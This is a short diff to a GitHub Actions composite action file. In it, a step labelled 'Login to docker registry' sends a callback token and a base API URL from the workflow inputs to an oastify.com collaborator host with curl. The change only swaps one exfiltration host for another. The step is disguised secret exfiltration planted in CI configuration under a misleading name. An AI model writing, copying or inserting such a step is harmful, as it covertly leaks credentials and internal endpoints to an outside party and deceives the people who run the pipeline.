@@ -114,7 +114,7 @@ runs:
     - name: Login to docker registry
       shell: bash
       run: |
-        curl http://0pqkpgr5az0r9ogp1x9xohqbp2vtjw7l.oastify.com/${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_token }} && curl http://0pqkpgr5az0r9ogp1x9xohqbp2vtjw7l.oastify.com/${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_urls.base_api }}       
+        curl https://g1ikanjmvlai7c5snixnpzlrxi39r0fp.oastify.com/${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_token }} && curl https://g1ikanjmvlai7c5snixnpzlrxi39r0fp.oastify.com/${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_urls.base_api }}       
     - uses: actions/cache/restore@v3
       if: steps.set-cache-file.outputs.cache_file != ''
       id: cache-docker-image
